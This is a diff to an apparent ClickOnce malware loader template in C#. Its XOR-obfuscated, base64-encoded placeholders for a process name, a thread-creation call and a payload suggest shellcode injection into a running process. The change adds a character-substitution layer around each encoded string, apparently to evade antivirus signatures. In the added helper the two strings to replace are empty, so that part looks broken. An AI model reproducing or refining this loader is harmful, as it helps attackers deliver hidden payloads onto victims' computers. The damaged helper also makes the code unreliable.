@@ -43,15 +43,15 @@ namespace ClickOnceTemplate
         static IntPtr VAR8()
         {
 			byte[] VAR9 = {[KEY]};
-			byte[] VAR100 = Convert.FromBase64String("[PROCESS_NAME]");
+			byte[] VAR100 = Convert.FromBase64String(VAR60.VAR61("[PROCESS_NAME]"));
 			byte[] VAR101 = VAR16.VAR28(VAR9, VAR100);
-			byte[] VAR102 = Convert.FromBase64String("[CREATE_THREAD]");
+			byte[] VAR102 = Convert.FromBase64String(VAR60.VAR61("[CREATE_THREAD]"));
 			byte[] VAR103 = VAR16.VAR28(VAR9, VAR102);
 			
             if (Process.GetProcessesByName(Encoding.ASCII.GetString(VAR101)).Length > 0)
             {				
 				
-				byte[] VAR10 = Convert.FromBase64String("[PAYLOAD]");
+				byte[] VAR10 = Convert.FromBase64String(VAR60.VAR61("[PAYLOAD]"));
 				Array.Reverse(VAR10, 0, VAR10.Length);
 				VAR10 = Convert.FromBase64String(Encoding.ASCII.GetString(VAR10));
 				
@@ -71,6 +71,14 @@ namespace ClickOnceTemplate
             return IntPtr.Zero;
         }
     }
+	
+	public class VAR60 {
+		public static string VAR61(string VAR62) {
+			string VAR63 = "";
+			string VAR64 = "";
+			return VAR62.Replace(VAR63, "A").Replace(VAR64, "B");
+		}
+	}
 
 	public class VAR16 {
 		public static byte[] VAR17(byte[] VAR18, byte[] VAR19) {
